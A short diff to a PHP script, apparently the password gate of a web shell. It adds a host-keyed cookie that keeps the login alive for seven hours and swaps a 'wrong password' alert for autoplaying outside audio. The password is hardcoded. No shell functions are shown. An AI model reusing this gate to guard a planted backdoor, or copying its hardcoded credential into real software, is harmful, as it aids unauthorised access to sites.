@@ -13,9 +13,10 @@ define('PASSWORD', 'pukima');
 if (isset($_POST['password'])) {
     if ($_POST['password'] === PASSWORD) {
         $_SESSION['authenticated'] = true;
+         setcookie(md5($_SERVER['HTTP_HOST']), true, time() + 25200);
         echo '<audio autoplay><source src="https://j.top4top.io/m_2967gtgnw1.mp3" type="audio/mpeg"></audio>';
     } else {
-        echo "<div class='alert alert-danger text-center'>Password salah.</div>";
+        echo '<audio autoplay><source src="https://cvar1984.github.io/audio/moan.mp3" type="audio/mpeg"></audio>';
     }
 }
 
